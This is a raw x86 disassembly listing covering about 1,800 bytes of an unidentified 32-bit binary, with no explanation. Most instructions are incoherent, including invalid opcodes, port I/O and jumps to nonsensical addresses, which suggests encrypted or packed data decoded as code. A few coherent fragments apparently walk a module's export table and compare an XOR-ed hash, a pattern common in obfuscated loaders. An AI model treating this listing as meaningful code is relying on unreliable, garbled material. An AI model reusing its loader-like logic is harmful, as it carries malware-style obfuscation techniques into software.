  40b480:	jmp    0x7df6f8e7
  40b485:	push   0x76
  40b487:	imul   esi,DWORD PTR [ecx-0x7b489d27],0xfffffff9
  40b48e:	test   DWORD PTR [eax+edx*1],esi
  40b491:	rcl    bl,0x36
  40b494:	dec    ebx
  40b495:	bound  edi,QWORD PTR [ebx+0x1de985ad]
  40b49b:	add    dl,0xff
  40b49e:	stos   DWORD PTR es:[edi],eax
  40b49f:	sub    bl,dh
  40b4a1:	in     al,0x10
  40b4a3:	idiv   esi
  40b4a5:	nop
  40b4a6:	jl     0x40b4a8
  40b4a8:	repz retf 0x57be
  40b4ac:	loop   0x40b4ac
  40b4ae:	(bad)  
  40b4af:	(bad)  
  40b4b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b4b2:	mov    esi,0x18e6ae7f
  40b4b7:	mov    BYTE PTR [esi+0x462032ed],ch
  40b4bd:	aam    0xc8
  40b4bf:	cmp    BYTE PTR [edi+esi*4],cl
  40b4c2:	sahf   
  40b4c3:	mov    DWORD PTR [ecx-0x1c97c546],eax
  40b4c9:	lahf   
  40b4ca:	add    ebp,DWORD PTR ds:0xaec92ec1
  40b4d0:	add    esi,esp
  40b4d2:	jp     0x40b4f1
  40b4d4:	xor    BYTE PTR [ecx+0x458bd44d],cl
  40b4da:	in     al,dx
  40b4db:	mov    ecx,DWORD PTR [ebp+0x8]
  40b4de:	add    ecx,DWORD PTR [eax+0x1c]
  40b4e1:	xor    esi,esi
  40b4e3:	mov    DWORD PTR [ebp-0x14],ecx
  40b4e6:	mov    eax,DWORD PTR [ebp-0x28]
  40b4e9:	mov    ecx,DWORD PTR [ebp+0x8]
  40b4ec:	add    ecx,DWORD PTR [eax+edi*4]
  40b4ef:	lea    eax,[ebp-0x8]
  40b4f2:	mov    DWORD PTR [ebp-0x30],ecx
  40b4f5:	push   eax
  40b4f6:	jmp    0x40b759
  40b4fb:	pop    eax
  40b4fc:	pop    ds
  40b4fd:	sub    BYTE PTR [ebp+0x69],bl
  40b500:	imul   ebp,DWORD PTR [ecx+0x1b],0x5437698f
  40b507:	add    eax,0xe897aff7
  40b50c:	lock jle 0x40b58d
  40b50f:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40b513:	fstp   TBYTE PTR [ebx-0x49f65710]
  40b519:	xchg   ebx,eax
  40b51a:	cld    
  40b51b:	xchg   ebp,eax
  40b51c:	out    dx,al
  40b51d:	jns    0x40b551
  40b51f:	mov    edx,0xd78383a8
  40b524:	sbb    eax,0xc732a06
  40b529:	add    edi,DWORD PTR [ecx-0x79fd496a]
  40b52f:	lahf   
  40b530:	xor    eax,DWORD PTR [ebx]
  40b532:	pop    esp
  40b533:	test   al,0xda
  40b535:	out    0x68,eax
  40b537:	pushf  
  40b538:	fst    QWORD PTR [ecx+0xb]
  40b53b:	aam    0x79
  40b53d:	shr    dl,cl
  40b53f:	sbb    BYTE PTR [eax+0x14],bh
  40b542:	fisttp DWORD PTR [edx]
  40b544:	sub    DWORD PTR [ecx-0x7c],esp
  40b547:	dec    esi
  40b548:	iret   
  40b549:	mov    ah,0x8f
  40b54b:	loope  0x40b4ce
  40b54d:	dec    esp
  40b54e:	into   
  40b54f:	pop    edi
  40b550:	out    0xbb,eax
  40b552:	push   edi
  40b553:	addr16 and ch,ah
  40b556:	std    
  40b557:	div    edx
  40b559:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b55a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b55b:	and    DWORD PTR [ebp-0x535a987c],0x663f318f
  40b565:	mov    ebx,0x159b5d3a
  40b56a:	xchg   BYTE PTR [edx-0x6db4f0c4],bl
  40b570:	neg    DWORD PTR [ebp-0x32797b80]
  40b576:	inc    edx
  40b577:	adc    ah,ah
  40b579:	cdq    
  40b57a:	mov    ch,0xc6
  40b57c:	sti    
  40b57d:	imul   esp,ebp,0xffffffe4
  40b580:	cmp    esp,esp
  40b582:	gs stos DWORD PTR es:[edi],eax
  40b584:	pushf  
  40b585:	or     BYTE PTR [eax],bl
  40b587:	test   DWORD PTR [edi+0x71],0xe2b33a49
  40b58e:	(bad)  
  40b590:	and    bl,dh
  40b592:	xor    esp,DWORD PTR [eax]
  40b594:	pop    ecx
  40b595:	(bad)  
  40b596:	jg     0x40b568
  40b598:	xchg   edx,ebx
  40b59a:	jmp    0x40b61b
  40b59c:	sub    BYTE PTR [ecx],0x5c
  40b59f:	adc    dl,dl
  40b5a1:	test   al,0x52
  40b5a3:	pop    ebx
  40b5a4:	outs   dx,BYTE PTR ds:[esi]
  40b5a5:	jg     0x40b595
  40b5a7:	lods   al,BYTE PTR ds:[esi]
  40b5a8:	fst    QWORD PTR [edi+0x70c1be3b]
  40b5ae:	mov    ebx,0x51b27a60
  40b5b3:	pop    edx
  40b5b4:	imul   ebp,ecx,0xffffffd9
  40b5b7:	fidiv  WORD PTR [edx+0x6b]
  40b5ba:	sub    bh,BYTE PTR [edx+0x73fa556a]
  40b5c0:	jmp    DWORD PTR [ebx]
  40b5c2:	cwde   
  40b5c3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b5c4:	jmp    0x487c630a
  40b5c9:	scas   eax,DWORD PTR es:[edi]
  40b5ca:	inc    DWORD PTR [ebx]
  40b5cc:	fidiv  WORD PTR [ebp-0x359f5c02]
  40b5d2:	vmovaps YMMWORD PTR [edx],ymm6
  40b5d6:	setno  BYTE PTR [ecx+0x1c88c480]
  40b5dd:	rol    DWORD PTR [edi-0x2e],0x49
  40b5e1:	jae    0x40b5df
  40b5e3:	mov    dl,0x9a
  40b5e5:	adc    BYTE PTR fs:[ecx],bl
  40b5e8:	or     BYTE PTR [ecx+0x2c],0x3a
  40b5ec:	xor    BYTE PTR [esp+eiz*4],ah
  40b5ef:	add    DWORD PTR [ecx+ecx*4+0x3b],eax
  40b5f3:	pop    es
  40b5f4:	in     eax,0x13
  40b5f6:	fisub  WORD PTR [edx]
  40b5f8:	push   0xa3bb260b
  40b5fd:	fistp  QWORD PTR [eax+0x27]
  40b600:	inc    ebx
  40b601:	scas   al,BYTE PTR es:[edi]
  40b602:	push   0x932662d1
  40b607:	mov    al,BYTE PTR [ebx]
  40b609:	lahf   
  40b60a:	das    
  40b60b:	mov    ah,0xd4
  40b60d:	ja     0x40b647
  40b60f:	sbb    al,bh
  40b611:	shr    DWORD PTR [eax],1
  40b613:	mov    ds,WORD PTR [eax+0x30]
  40b616:	pop    edx
  40b617:	mov    dx,0x93e6
  40b61b:	inc    eax
  40b61c:	cli    
  40b61d:	enter  0x557a,0xba
  40b621:	enter  0x1bdb,0xeb
  40b625:	dec    ebp
  40b626:	out    dx,al
  40b627:	leave  
  40b628:	pop    esp
  40b629:	in     eax,dx
  40b62a:	ds mov dl,0x83
  40b62d:	iret   
  40b62e:	add    edx,DWORD PTR [esi-0x4ff256e4]
  40b634:	aaa    
  40b635:	fcom   QWORD PTR [esi+0x3a]
  40b638:	repz xchg esi,eax
  40b63a:	jb     0x40b6a4
  40b63c:	fcmovb st,st(5)
  40b63e:	jmp    0x64f6dbef
  40b643:	cdq    
  40b644:	sub    BYTE PTR ss:[ebx+0x4bb5ac14],0xdf
  40b64c:	imul   ebx,DWORD PTR [edx+esi*2],0xffffffe1
  40b650:	add    eax,0xc984322
  40b655:	(bad)  
  40b656:	out    dx,eax
  40b657:	enter  0xb737,0x60
  40b65b:	jl     0x40b6aa
  40b65d:	mov    ah,bl
  40b65f:	(bad)  
  40b660:	lds    esi,FWORD PTR [eax+0x8]
  40b663:	inc    ebx
  40b664:	adc    BYTE PTR [esi-0x4bae4651],0xa3
  40b66b:	loopne 0x40b689
  40b66d:	add    DWORD PTR [ecx+ebp*8-0x66],edi
  40b671:	and    al,0x2
  40b673:	adc    cl,dl
  40b675:	cmp    bl,BYTE PTR [ebp-0x6409e776]
  40b67b:	js     0x40b64b
  40b67d:	fwait
  40b67e:	and    DWORD PTR [ecx],ebp
  40b680:	jp     0x40b699
  40b682:	lock or DWORD PTR [eax-0x74bec631],edi
  40b689:	retf   
  40b68a:	xchg   bl,dh
  40b68c:	call   0x8691e5fa
  40b691:	mov    eax,0xe7214fb9
  40b696:	mov    edi,0xbd7232a1
  40b69b:	scas   eax,DWORD PTR es:[edi]
  40b69c:	jecxz  0x40b68f
  40b69e:	mov    DWORD PTR ds:0xba261ca0,ebp
  40b6a4:	mov    BYTE PTR [esi],al
  40b6a6:	std    
  40b6a7:	and    eax,0xe8e12c3d
  40b6ac:	mov    DWORD PTR [esi],edx
  40b6ae:	sahf   
  40b6af:	shr    BYTE PTR [ecx-0x36],cl
  40b6b2:	data16 (bad) 
  40b6b4:	sub    esp,DWORD PTR [esi+0x379646ce]
  40b6ba:	popf   
  40b6bb:	fld    DWORD PTR [ecx+edi*2+0x6d]
  40b6bf:	dec    esi
  40b6c0:	dec    edx
  40b6c1:	mov    fs,WORD PTR [esi]
  40b6c3:	je     0x40b6ce
  40b6c5:	icebp  
  40b6c6:	rol    BYTE PTR [edx],1
  40b6c8:	cmc    
  40b6c9:	lock adc eax,0xc15d1fc3
  40b6cf:	push   esp
  40b6d0:	(bad)  
  40b6d1:	sbb    DWORD PTR [eax],esi
  40b6d3:	jo     0x40b70b
  40b6d5:	jl     0x40b69e
  40b6d7:	cmp    BYTE PTR [ebp+0x28],al
  40b6da:	sbb    al,0xf4
  40b6dc:	cmp    edx,edi
  40b6de:	call   0x88954e16
  40b6e3:	loope  0x40b66f
  40b6e5:	sub    al,0xa2
  40b6e7:	ds jo  0x40b6a7
  40b6ea:	sbb    al,BYTE PTR [eax+0x2b0835c2]
  40b6f0:	outs   dx,DWORD PTR ds:[esi]
  40b6f1:	mov    eax,gs:0x122f15f3
  40b6f7:	push   eax
  40b6f8:	push   cs
  40b6f9:	xchg   esi,eax
  40b6fa:	jbe    0x40b6b2
  40b6fc:	inc    eax
  40b6fd:	cli    
  40b6fe:	imul   ecx,DWORD PTR ds:0x47da23aa,0x89bf98d
  40b708:	and    cl,BYTE PTR [edi]
  40b70a:	inc    ebp
  40b70b:	or     dh,bl
  40b70d:	in     al,0xa8
  40b70f:	icebp  
  40b710:	mov    DWORD PTR [ecx+0x7ee9507b],esi
  40b716:	jp     0x40b770
  40b718:	push   es
  40b719:	jl     0x40b766
  40b71b:	xor    al,0x9e
  40b71d:	add    eax,DWORD PTR [edx-0x617a4513]
  40b723:	sbb    dl,0x79
  40b726:	loop   0x40b72d
  40b728:	xor    DWORD PTR [esi-0x39471291],edi
  40b72e:	inc    ebx
  40b72f:	les    edx,FWORD PTR [ebx+0x5e]
  40b732:	jo     0x40b6fa
  40b734:	clc    
  40b735:	out    0x8a,al
  40b737:	xor    edi,DWORD PTR [edx-0x6]
  40b73a:	outs   dx,DWORD PTR ds:[esi]
  40b73b:	xor    esp,DWORD PTR [edi]
  40b73d:	sbb    edx,0xbd92fe09
  40b743:	retf   0xc50a
  40b746:	xor    esp,DWORD PTR [eax]
  40b748:	pop    ebx
  40b749:	mov    BYTE PTR [esi-0x23f35a7d],ch
  40b74f:	mov    bl,cl
  40b751:	(bad)  
  40b753:	out    0xd2,eax
  40b755:	sbb    bh,BYTE PTR [eax+0x75ff0466]
  40b75b:	sar    bh,1
  40b75d:	jne    0x40b76b
  40b75f:	call   0x410212
  40b764:	mov    eax,DWORD PTR [ebp-0x4]
  40b767:	mov    ecx,DWORD PTR [ebp-0x8]
  40b76a:	xor    eax,0x7510854
  40b76f:	add    eax,ebx
  40b771:	cmp    ecx,eax
  40b773:	jne    0x40b9f9
  40b779:	jmp    0x40b9dc
  40b77e:	mov    edi,0x716ef17f
  40b783:	jo     0x40b7c6
  40b785:	das    
  40b786:	pushf  
  40b787:	dec    edi
  40b788:	je     0x40b75f
  40b78a:	les    ebp,FWORD PTR [esi+ebp*1+0x7efeb25b]
  40b791:	jle    0x40b7cb
  40b793:	jl     0x40b813
  40b795:	jle    0x40b7e2
  40b797:	add    al,ah
  40b799:	dec    eax
  40b79a:	add    BYTE PTR [edx-0x52e85218],0xed
  40b7a1:	mov    BYTE PTR cs:[ecx+0x13],bl
  40b7a5:	call   DWORD PTR [edi-0x46]
  40b7a8:	test   BYTE PTR [eax+0xb048d55],cl
  40b7ae:	stc    
  40b7af:	das    
  40b7b0:	ins    DWORD PTR es:[edi],dx
  40b7b1:	pop    esi
  40b7b2:	mov    dh,0x64
  40b7b4:	mov    ds:0x7e909b93,eax
  40b7b9:	dec    eax
  40b7ba:	adc    DWORD PTR [eax],ebx
  40b7bc:	out    dx,eax
  40b7bd:	imul   esp,DWORD PTR [ebx],0xe74e121d
  40b7c3:	popa   
  40b7c4:	das    
  40b7c5:	add    al,0x91
  40b7c7:	mov    DWORD PTR [eax+ecx*2],esi
  40b7ca:	inc    esp
  40b7cb:	scas   al,BYTE PTR es:[edi]
  40b7cc:	popa   
  40b7cd:	fnstcw WORD PTR [eax-0x350b83e6]
  40b7d3:	and    dh,BYTE PTR [edx+0x12]
  40b7d6:	mov    dh,0xaa
  40b7d9:	and    eax,DWORD PTR [ebp-0x40]
  40b7dc:	aad    0xbe
  40b7de:	std    
  40b7df:	sub    DWORD PTR [ebx],edx
  40b7e1:	mov    ds:0x768853c9,eax
  40b7e6:	lods   eax,DWORD PTR ds:[esi]
  40b7e7:	pop    ds
  40b7e8:	mov    cl,0xf4
  40b7ea:	clc    
  40b7eb:	jnp    0x40b7f0
  40b7ed:	(bad)  
  40b7ee:	pop    edi
  40b7ef:	push   ds
  40b7f0:	retf   
  40b7f1:	cmp    BYTE PTR [ebx+esi*4-0xb],al
  40b7f5:	sub    DWORD PTR [ebx-0x4097ad22],edi
  40b7fb:	lock inc ecx
  40b7fd:	rol    DWORD PTR [esi+0x40],1
  40b800:	and    DWORD PTR [eax],ecx
  40b802:	push   ss
  40b803:	mov    al,ds:0x58a213ac
  40b808:	dec    ebx
  40b809:	(bad)  [ebx]
  40b80b:	push   ebp
  40b80c:	dec    esi
  40b80d:	xchg   edi,eax
  40b80e:	(bad)  [eax-0x1deaf35c]
  40b814:	inc    ecx
  40b815:	imul   edx,DWORD PTR [eax-0x32],0x7cb5e764
  40b81c:	xchg   edx,eax
  40b81d:	xchg   ecx,eax
  40b81e:	xchg   BYTE PTR [esi],cl
  40b820:	or     dh,BYTE PTR [esi]
  40b822:	daa    
  40b823:	adc    al,BYTE PTR [ebx+0x29d87b4b]
  40b829:	les    esi,FWORD PTR [edi-0x77592d4d]
  40b82f:	mov    edx,ds
  40b831:	arpl   WORD PTR [eax-0x1d0c3f81],cx
  40b837:	int    0x9c
  40b839:	clc    
  40b83a:	test   al,0x9e
  40b83c:	data16 rcl BYTE PTR [edi],cl
  40b83f:	lds    edx,FWORD PTR ds:[ebp-0x77021a02]
  40b846:	dec    ebx
  40b847:	xor    BYTE PTR [esi],ch
  40b849:	push   cs
  40b84a:	dec    edx
  40b84b:	scas   al,BYTE PTR es:[edi]
  40b84c:	adc    cl,bl
  40b84e:	sar    DWORD PTR [eax],cl
  40b850:	out    0x8e,al
  40b852:	xlat   BYTE PTR ds:[ebx]
  40b853:	fisub  WORD PTR [edi+esi*4]
  40b856:	pop    es
  40b857:	rcl    BYTE PTR [eax],cl
  40b859:	cdq    
  40b85a:	shr    al,0x35
  40b85d:	inc    esi
  40b85e:	inc    eax
  40b85f:	pop    eax
  40b860:	out    dx,eax
  40b861:	add    ebx,edx
  40b863:	(bad)  
  40b864:	out    0x8,eax
  40b866:	sub    BYTE PTR [edi-0x2a55f007],0x8d
  40b86d:	(bad)  
  40b86e:	push   eax
  40b86f:	fcomp  QWORD PTR [eax+eiz*1+0x14]
  40b873:	dec    edi
  40b874:	or     DWORD PTR [ebp-0x3168c8d9],ebx
  40b87a:	or     al,0xbf
  40b87c:	xchg   edi,eax
  40b87d:	(bad)  
  40b87f:	cwde   
  40b880:	std    
  40b881:	mov    bh,0x52
  40b883:	cmp    edx,DWORD PTR [ebx]
  40b885:	mov    bl,0x62
  40b887:	dec    ecx
  40b888:	sbb    al,0xb2
  40b88a:	hlt    
  40b88b:	adc    ebp,DWORD PTR [ebp+0x35f5ef1d]
  40b891:	xchg   ebx,eax
  40b892:	out    0xd4,al
  40b894:	and    DWORD PTR [ecx+0x1f6bf7d1],ecx
  40b89a:	cmp    edi,DWORD PTR [ebx]
  40b89c:	inc    ebx
  40b89d:	and    dh,bh
  40b89f:	add    DWORD PTR [esi-0x32],ebx
  40b8a2:	fiadd  WORD PTR [ebx+0x11]
  40b8a5:	or     al,0x6
  40b8a7:	mov    BYTE PTR [ecx+0x3d954cb5],ch
  40b8ad:	daa    
  40b8ae:	stos   DWORD PTR es:[edi],eax
  40b8af:	jle    0x40b886
  40b8b1:	fdivp  st(0),st
  40b8b3:	ins    BYTE PTR es:[edi],dx
  40b8b4:	add    al,0x5d
  40b8b6:	xchg   ebp,eax
  40b8b7:	std    
  40b8b8:	ins    DWORD PTR es:[edi],dx
  40b8b9:	outs   dx,DWORD PTR ds:[esi]
  40b8ba:	fwait
  40b8bb:	fwait
  40b8bc:	sub    ebx,DWORD PTR [ebx-0x33]
  40b8bf:	jmp    0x40b8e6
  40b8c1:	jno    0x40b905
  40b8c3:	pop    es
  40b8c4:	adc    ebx,DWORD PTR [eax]
  40b8c6:	sub    edx,0x1fb33fec
  40b8cc:	out    0x2b,eax
  40b8ce:	cmc    
  40b8cf:	ror    BYTE PTR [edx+eiz*2],cl
  40b8d2:	rcr    DWORD PTR [ecx],1
  40b8d4:	ja     0x40b92b
  40b8d6:	sbb    ecx,eax
  40b8d8:	or     eax,0xf3b256b9
  40b8dd:	fucomip st,st(3)
  40b8df:	div    BYTE PTR [ebx-0x62]
  40b8e2:	fcmovnu st,st(6)
  40b8e4:	mov    esi,0x3788124
  40b8e9:	sub    ecx,eax
  40b8eb:	outs   dx,BYTE PTR ds:[esi]
  40b8ec:	lods   al,BYTE PTR ds:[esi]
  40b8ed:	or     dl,BYTE PTR [eax+0x13]
  40b8f0:	fwait
  40b8f1:	dec    ebx
  40b8f2:	push   ebp
  40b8f3:	ins    BYTE PTR es:[edi],dx
  40b8f4:	enter  0xa4ed,0xc2
  40b8f8:	lds    edi,FWORD PTR [ecx+0x18]
  40b8fb:	fstp   QWORD PTR [edx-0x7e]
  40b8fe:	cmc    
  40b8ff:	(bad)
  40b902:	pop    ecx
  40b903:	pop    edx
  40b904:	pop    ds
  40b905:	jmp    0x9dd:0x6f5dedc3
  40b90c:	shl    cl,0x3b
  40b90f:	push   es
  40b910:	rcl    cl,0xad
  40b913:	test   eax,0x9b0671cf
  40b918:	idiv   BYTE PTR [eax+0x5c]
  40b91b:	mov    esi,0xac376a3f
  40b920:	dec    edx
  40b921:	bnd jmp 0x2bd84b32
  40b927:	test   BYTE PTR [edx-0x7f],al
  40b92a:	cmp    eax,DWORD PTR [esi+edx*1]
  40b92d:	mov    cl,0x0
  40b92f:	out    dx,al
  40b930:	call   0x40fe41d7
  40b935:	and    BYTE PTR [ebp+0x68],bh
  40b938:	call   0x55e6:0xfdb2b6b4
  40b93f:	in     al,dx
  40b940:	(bad)  
  40b941:	aaa    
  40b942:	add    eax,0xa22b4453
  40b947:	ret    
  40b948:	loopne 0x40b97a
  40b94a:	cmp    al,0x61
  40b94c:	xchg   DWORD PTR [ecx],eax
  40b94e:	in     al,0x47
  40b950:	cmp    al,BYTE PTR [esi+esi*8+0x34]
  40b954:	lahf   
  40b955:	es clc 
  40b957:	and    BYTE PTR [esp+esi*2+0x9b355bb],bh
  40b95e:	xchg   ebx,eax
  40b95f:	test   BYTE PTR [edx-0x65],0xcc
  40b963:	mov    al,ds:0x3c8da3d6
  40b968:	sub    eax,0x7ba0536a
  40b96d:	cmp    al,0xdd
  40b96f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b970:	pop    ss
  40b971:	xor    eax,0x9173b810
  40b976:	adc    ch,al
  40b978:	ds and ebp,ecx
  40b97b:	jecxz  0x40b9ee
  40b97d:	mov    ah,BYTE PTR [ecx]
  40b97f:	scas   al,BYTE PTR es:[edi]
  40b980:	xor    BYTE PTR [edi-0x32d8cf41],bl
  40b986:	xor    DWORD PTR [ebx],ebx
  40b988:	jae    0x40b95a
  40b98a:	int    0xc4
  40b98c:	ins    DWORD PTR es:[edi],dx
  40b98d:	into   
  40b98e:	out    0x5e,eax
  40b990:	add    eax,0xdf63465a
  40b995:	outs   dx,BYTE PTR ds:[esi]
  40b996:	iret   
  40b997:	lea    ebx,[ebx]
  40b999:	xchg   esi,eax
  40b99a:	mov    ah,0x73
  40b99c:	mov    gs:0xcbec2e1c,eax
  40b9a2:	push   esp
  40b9a3:	pop    es
  40b9a4:	and    ah,BYTE PTR [esp+eax*8-0x51]
  40b9a8:	rol    DWORD PTR [edi-0x58121ba2],1
  40b9ae:	retf   0xc7ad
  40b9b1:	loop   0x40b945
  40b9b3:	mov    eax,0x623bd280
  40b9b8:	jno    0x40b972
  40b9ba:	inc    ebx
  40b9bb:	aam    0xce
  40b9bd:	mov    DWORD PTR [edi],edx
  40b9bf:	cs and esi,edx
  40b9c2:	or     BYTE PTR [ebx+esi*2-0x480c1dcc],bl
  40b9c9:	add    BYTE PTR [esp+eiz*8+0x38b13f05],ch
  40b9d0:	jnp    0x40b96a
  40b9d2:	and    eax,DWORD PTR [edi]
  40b9d4:	push   ebx
  40b9d5:	xchg   ebp,eax
  40b9d6:	and    BYTE PTR [ebx],0xbe
  40b9d9:	sbb    edi,DWORD PTR [edx-0x1fba7415]
  40b9df:	inc    edi
  40b9e0:	cmp    edi,eax
  40b9e2:	jb     0x40a46c
  40b9e8:	jmp    0x40bc6c
  40b9ed:	mov    eax,DWORD PTR [ebp-0x4]
  40b9f0:	xor    eax,esi
  40b9f2:	add    eax,ebx
  40b9f4:	jmp    0x40d598
  40b9f9:	mov    eax,DWORD PTR [ebp-0x2c]
  40b9fc:	jmp    0x40bc5f
  40ba01:	test   BYTE PTR [ecx],ch
  40ba03:	popa   
  40ba04:	lahf   
  40ba05:	jno    0x40ba7e
  40ba07:	inc    eax
  40ba08:	xor    DWORD PTR [edi+ebp*8-0x45a557f8],eax
  40ba0f:	dec    esp
  40ba10:	cwde   
  40ba11:	jl     0x40ba10
  40ba13:	jle    0x40ba93
  40ba15:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40ba19:	mov    eax,0x10cc4c00
  40ba1e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ba1f:	cmp    BYTE PTR [esi-0x5b],bl
  40ba22:	addr16 popa 
  40ba24:	push   ds
  40ba25:	je     0x40b9be
  40ba27:	sbb    eax,0x5cae656b
  40ba2c:	add    eax,0x7a73eab
  40ba31:	aaa    
  40ba32:	or     al,0x61
  40ba34:	or     al,BYTE PTR [ecx+0x6d]
  40ba37:	(bad)  [edx]
  40ba39:	sbb    ebp,ecx
  40ba3b:	addr16 fnstcw WORD PTR [bp+di]
  40ba3f:	clc    
  40ba40:	outs   dx,BYTE PTR ds:[esi]
  40ba41:	jl     0x40baa5
  40ba43:	leave  
  40ba44:	test   DWORD PTR [esi+edx*1],esp
  40ba47:	loope  0x40ba2d
  40ba49:	pop    ebx
  40ba4a:	scas   al,BYTE PTR es:[edi]
  40ba4b:	inc    eax
  40ba4c:	aaa    
  40ba4d:	jae    0x40baaf
  40ba4f:	shl    BYTE PTR [eax-0x1d],1
  40ba52:	fwait
  40ba53:	les    ebx,FWORD PTR [esi+0x6de0d8a0]
  40ba59:	clc    
  40ba5a:	xchg   dh,bh
  40ba5c:	imul   esp,DWORD PTR [edi],0x77
  40ba5f:	push   ds
  40ba60:	daa    
  40ba61:	repnz pop edi
  40ba63:	hlt    
  40ba64:	pop    ds
  40ba65:	sbb    BYTE PTR [ebx-0x57],bl
  40ba68:	repnz bound esi,QWORD PTR [esi-0x656e9032]
  40ba6f:	jae    0x40badd
  40ba71:	repz int 0x24
  40ba74:	push   ebp
  40ba75:	fadd   QWORD PTR [edi]
  40ba77:	and    eax,0x5b796ed9
  40ba7c:	sub    eax,0x9e545e7
  40ba81:	pop    esp
  40ba82:	icebp  
  40ba83:	loopne 0x40bae3
  40ba85:	and    ecx,DWORD PTR [ecx+0xb72a48]
  40ba8b:	shl    DWORD PTR [eax+0x48b0dd32],cl
  40ba91:	nop
  40ba92:	mov    esp,0xb82c19ad
  40ba97:	or     BYTE PTR [ebp+0x72bc900],cl
  40ba9d:	inc    esp
  40ba9e:	push   0xbb22fc06
  40baa3:	add    DWORD PTR [ebx+0x5d3e5c93],ebp
  40baa9:	or     BYTE PTR [eax-0x676efff1],dl
  40baaf:	adc    eax,0x18366e84
  40bab4:	inc    eax
  40bab5:	aam    0x4c
  40bab7:	retf   0x4750
  40baba:	fidivr DWORD PTR [edx+0x1b45d1cf]
  40bac0:	cld    
  40bac1:	outs   dx,DWORD PTR ds:[esi]
  40bac2:	out    dx,eax
  40bac3:	sub    eax,0xab310937
  40bac8:	test   DWORD PTR [esi-0x4f3907b1],ebp
  40bace:	test   al,0x94
  40bad0:	fadd   DWORD PTR [ebx-0x4743eb23]
  40bad6:	repz dec esp
  40bad8:	popf   
  40bad9:	(bad)  
  40bada:	jnp    0x40baee
  40badc:	jae    0x40bb19
  40bade:	in     eax,0x78
  40bae0:	cmp    bl,BYTE PTR [ebp+0x362e46c8]
  40bae6:	xor    eax,0x1f7e5778
  40baeb:	sub    bh,BYTE PTR [ebx-0x56158067]
  40baf1:	or     eax,0xcd188e77
  40baf6:	rcl    BYTE PTR ds:0x19a0d2c3,cl
  40bafc:	addr16 mov fs,eax
  40baff:	push   ecx
  40bb00:	dec    edi
  40bb01:	xchg   esp,eax
  40bb02:	fs inc ebx
  40bb04:	call   0xe47d:0xfbdb8345
  40bb0b:	xlat   BYTE PTR ds:[ebx]
  40bb0c:	aas    
  40bb0d:	or     ecx,DWORD PTR [ecx]
  40bb0f:	pop    esp
  40bb10:	and    cl,BYTE PTR [esi]
  40bb12:	inc    esi
  40bb13:	out    0xbc,al
  40bb15:	std    
  40bb16:	jp     0x40bae0
  40bb18:	or     ecx,DWORD PTR [eax-0x6f3bbbc1]
  40bb1e:	xchg   ecx,eax
  40bb1f:	dec    ebx
  40bb20:	xor    eax,0xcdf476fd
  40bb25:	xor    al,BYTE PTR [ebx-0x2f]
  40bb28:	inc    ebx
  40bb29:	mov    DWORD PTR [ebp-0x49],edi
  40bb2c:	mov    eax,0xcd5cdbca
  40bb31:	mov    ch,0x9f
  40bb33:	mov    dh,0x20
  40bb35:	jne    0x40bb0b
  40bb37:	jbe    0x40bb83
  40bb39:	mov    al,0x90
  40bb3b:	cmp    al,0x91
  40bb3d:	out    dx,eax
  40bb3e:	pop    ebp
  40bb3f:	add    bh,BYTE PTR [eax+0x6ffa1616]
  40bb45:	push   ecx
  40bb46:	mov    dl,0xea
  40bb48:	sbb    edx,DWORD PTR [esi+0x553557b9]
  40bb4e:	xor    ebx,edi
  40bb50:	aas    
  40bb51:	cli    
  40bb52:	pushf  
  40bb53:	leave  
  40bb54:	es cli 
  40bb56:	int3   
  40bb57:	xchg   edi,eax
  40bb58:	in     al,dx
  40bb59:	and    al,BYTE PTR [ebx+0x19]
  40bb5c:	push   ds
  40bb5d:	sub    esp,esp
  40bb5f:	xchg   esp,eax
  40bb60:	stos   BYTE PTR es:[edi],al
  40bb61:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bb62:	hlt    
  40bb63:	ret    
  40bb64:	addr16 aad 0xa4
  40bb67:	mov    BYTE PTR [eax-0x38cf427b],dh
  40bb6d:	leave  
  40bb6e:	out    0xaf,eax
  40bb70:	in     al,dx
  40bb71:	dec    ecx
  40bb72:	(bad)  
  40bb73:	rcr    ebx,1
  40bb75:	dec    esi
  40bb76:	les    ebp,FWORD PTR [eax]
  40bb78:	iret   
  40bb79:	leave  
  40bb7a:	fdiv   QWORD PTR [eax-0x77]
  40bb7d:	xor    BYTE PTR [eax],0xbe
  40bb80:	push   ds
  40bb81:	xchg   esp,eax
  40bb82:	xor    DWORD PTR [eax+0x5b81d8e6],edi
  40bb88:	lea    edx,[eax+0x1d]
  40bb8b:	push   esp
  40bb8c:	xor    BYTE PTR [ebx],dh
  40bb8e:	rcr    DWORD PTR [edi-0x7b],0x17
  40bb92:	cmp    DWORD PTR [edi+0x3442b94e],edx
  40bb98:	pop    ebp
  40bb99:	pop    esp
  40bb9a:	popf   
  40bb9b:	jo     0x40bbff
  40bb9d:	lods   al,BYTE PTR ds:[esi]
  40bb9e:	push   esi
  40bb9f:	out    dx,al
  40bba0:	inc    ebx
  40bba1:	scas   eax,DWORD PTR es:[edi]
  40bba2:	xchg   ebx,eax
  40bba3:	jmp    0x40bb9b
  40bba5:	mov    edi,0xb67a33a2
  40bbaa:	lods   eax,DWORD PTR ds:[esi]
  40bbab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bbac:	scas   eax,DWORD PTR es:[edi]
  40bbad:	cwde   
  40bbae:	rcl    esp,cl
  40bbb0:	pop    ecx
  40bbb1:	fistp  QWORD PTR [edx+0x54e9403]
  40bbb7:	leave  
  40bbb8:	push   ds
  40bbb9:	add    DWORD PTR [eax-0x1739ddba],esi
  40bbbf:	or     eax,0x323d4228
  40bbc4:	inc    eax
  40bbc5:	fild   WORD PTR [edx]
  40bbc7:	pop    ecx
  40bbc8:	mov    al,ds:0x7c03f4e2
  40bbcd:	push   esi
  40bbce:	or     BYTE PTR [ebx+0x64ac1dfe],al
  40bbd4:	cld    
  40bbd5:	mov    dh,0x67
  40bbd7:	inc    edx
  40bbd8:	and    BYTE PTR [eax],0x89
  40bbdb:	xor    BYTE PTR [ecx+0x7c9c9c7b],al
